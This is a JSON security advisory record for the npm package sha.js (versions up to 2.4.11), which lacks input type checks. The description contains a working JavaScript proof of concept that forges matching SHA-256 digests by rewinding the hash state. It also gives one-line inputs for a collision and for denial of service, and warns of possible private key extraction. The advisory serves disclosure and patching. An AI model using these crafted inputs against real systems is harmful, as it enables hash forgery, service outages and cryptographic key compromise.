{
  "Severity": "CRITICAL",
  "UpdatedAt": "2025-08-21T14:47:57Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "sha.js"
  },
  "Advisory": {
    "DatabaseId": 308467,
    "Id": "GSA_kwCzR0hTQS05NW0zLTdxOTgtOHhyNc4ABLTz",
    "GhsaId": "GHSA-95m3-7q98-8xr5",
    "References": [
      {
        "Url": "https://github.com/browserify/sha.js/security/advisories/GHSA-95m3-7q98-8xr5"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-9288"
      },
      {
        "Url": "https://github.com/browserify/sha.js/pull/78"
      },
      {
        "Url": "https://github.com/browserify/sha.js/commit/f2a258e9f2d0fcd113bfbaa49706e1ac0d979ba5"
      },
      {
        "Url": "https://www.cve.org/CVERecord?id=CVE-2025-9287"
      },
      {
        "Url": "https://github.com/advisories/GHSA-95m3-7q98-8xr5"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-95m3-7q98-8xr5"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-9288"
      }
    ],
    "Description": "### Summary\n\nThis is the same as [GHSA-cpq7-6gpm-g9rc](https://github.com/browserify/cipher-base/security/advisories/GHSA-cpq7-6gpm-g9rc) but just for `sha.js`, as it has its own implementation.\n\nMissing input type checks lead to it calculating invalid values, hanging, rewinding the hash state (including turning a tagged hash into an untagged hash) on malicious JSON-stringifyable input\n\n### Details\n\nSee PoC\n\n### PoC\n```js\nconst forgeHash = (data, payload) =\u003e JSON.stringify([payload, { length: -payload.length}, [...data]])\n\nconst sha = require('sha.js')\nconst { randomBytes } = require('crypto')\n\nconst sha256 = (...messages) =\u003e {\n  const hash = sha('sha256')\n  messages.forEach((m) =\u003e hash.update(m))\n  return hash.digest('hex')\n}\n\nconst validMessage = [randomBytes(32), randomBytes(32), randomBytes(32)] // whatever\n\nconst payload = forgeHash(Buffer.concat(validMessage), 'Hashed input means safe')\nconst receivedMessage = JSON.parse(payload) // e.g. over network, whatever\n\nconsole.log(sha256(...validMessage))\nconsole.log(sha256(...receivedMessage))\nconsole.log(receivedMessage[0])\n```\n\nOutput:\n```\n638d5bf3ca5d1decf7b78029f1c4a58558143d62d0848d71e27b2a6ff312d7c4\n638d5bf3ca5d1decf7b78029f1c4a58558143d62d0848d71e27b2a6ff312d7c4\nHashed input means safe\n```\n\nOr just:\n```console\n\u003e require('sha.js')('sha256').update('foo').digest('hex')\n'2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae'\n\u003e require('sha.js')('sha256').update('fooabc').update({length:-3}).digest('hex')\n'2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae'\n```\n\n### Impact\n\n1. Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash.\n2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`\n    This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js)\n4. DoS on `{length:'1e99'}`\n5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration)",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-08-21T14:47:55Z",
    "Severity": "CRITICAL",
    "Summary": "sha.js is missing type checks leading to hash rewind and passing on crafted data",
    "UpdatedAt": "2025-08-21T14:47:57Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "2.4.12"
      },
      "VulnerableVersionRange": "\u003c= 2.4.11"
    }
  ]
}